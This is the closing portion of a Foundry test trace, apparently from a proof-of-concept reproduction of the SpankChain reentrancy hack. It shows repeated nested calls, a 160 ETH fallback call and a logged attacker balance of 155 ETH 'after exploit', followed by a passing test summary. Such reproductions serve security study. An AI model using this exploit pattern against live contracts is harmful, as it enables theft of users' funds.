    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФЬтФА [40] SpankChainExploit::fallback{value: 160000000000000000000}()
    тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФФтФА тЖР [Stop] 
    тФЬтФА [0] 0x0000000000000000000000000000000000000000::fallback{value: 5000000000000000000}()
    тФВ   тФФтФА тЖР [Stop] 
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 155000000000000000000 [1.55e20], decimals: 18)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 374.15ms (3.45ms CPU time)

Ran 2 test suites in 667.09ms (681.36ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
